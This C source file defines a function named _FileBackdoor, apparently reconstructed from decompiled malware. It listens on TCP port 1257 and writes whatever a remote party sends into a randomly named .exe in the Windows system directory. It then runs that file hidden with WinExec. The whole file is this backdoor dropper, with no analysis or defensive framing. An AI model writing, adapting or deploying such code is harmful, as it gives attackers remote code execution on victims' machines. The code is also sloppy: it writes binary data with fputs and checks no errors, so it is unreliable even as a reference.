#include "data_globals.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#pragma optimize("", off)
DWORD WINAPI _FileBackdoor(void)
{
    volatile struct _LocalCtx {
        DWORD DVar1;
        uint32_t random_value;
        int bytes_received;
        struct sockaddr_in local_398;
        WSADATA local_388;
        char local_1f5[25];
        CHAR local_1dc[256];
        char local_dc[200];
        FILE *local_14;
        SOCKET local_10;
    } ctx;

    // Initializations
    // Some variables will be assigned later

    WSAStartup(MAKEWORD(2,2), &ctx.local_388);
    ctx.local_10 = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    ctx.local_398.sin_family = AF_INET;
    ctx.local_398.sin_port = htons(1257);
    ctx.local_398.sin_addr.s_addr = INADDR_ANY;

    bind(ctx.local_10, (struct sockaddr *)&ctx.local_398, sizeof(struct sockaddr_in));
    listen(ctx.local_10, 1);
    ctx.local_10 = accept(ctx.local_10, (struct sockaddr *)&ctx.local_398, NULL);

    memset(ctx.local_dc, 0, sizeof(ctx.local_dc));
    memset(ctx.local_1dc, 0, sizeof(ctx.local_1dc));
    memset(ctx.local_1f5, 0, sizeof(ctx.local_1f5));

    ctx.DVar1 = GetTickCount();
    srand(ctx.DVar1);
    GetSystemDirectoryA(ctx.local_1dc, sizeof(ctx.local_1dc));
    ctx.random_value = rand();
    sprintf(ctx.local_1f5, "\\%d.exe", ctx.random_value);
    strcat(ctx.local_1dc, ctx.local_1f5);
    ctx.local_14 = fopen(ctx.local_1dc, "wb");

    while (1) {
        ctx.bytes_received = recv(ctx.local_10, ctx.local_dc, sizeof(ctx.local_dc), 0);
        if (ctx.bytes_received == 0) break;
        fputs(ctx.local_dc, ctx.local_14);
        memset(ctx.local_dc, 0, sizeof(ctx.local_dc));
    }

    fclose(ctx.local_14);
    closesocket(ctx.local_10);
    WinExec(ctx.local_1dc, 0);

    return 0;
}
#pragma optimize("", on)
